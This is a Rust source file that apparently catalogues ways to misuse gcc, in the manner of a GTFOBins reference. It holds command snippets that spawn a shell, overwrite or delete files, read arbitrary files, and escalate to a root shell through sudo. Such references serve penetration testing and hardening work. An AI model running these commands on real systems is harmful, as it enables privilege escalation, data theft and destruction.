pub static BIN_NAME: &'static str = "gcc";
pub static SH_CODE: &'static str = r#"
    
    gcc -wrapper /bin/sh,-s .
"#;
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_delete
    gcc -xc /dev/null -o $LFILE
"#;
pub static FR_CODE_1: &'static str = r#"
    
    LFILE=file_to_read
    gcc -x c -E "$LFILE"
"#;
pub static FR_DESC_2: &'static str = "The file is read and parsed as a list of files (one per line), the content is disaplyed as error messages, thus this might not be suitable to read arbitrary data.";
pub static FR_CODE_2: &'static str = r#"
    
    LFILE=file_to_read
    gcc @"$LFILE"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo gcc -wrapper /bin/sh,-s .
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR_1: Code<'static> = Code {
    title: "FR_CODE_1",
    code: FR_CODE_1,
    tag: Tag::FR,
};
pub static FR_2: Code<'static> = Code {
    title: "FR_CODE_2",
    code: FR_CODE_2,
    tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
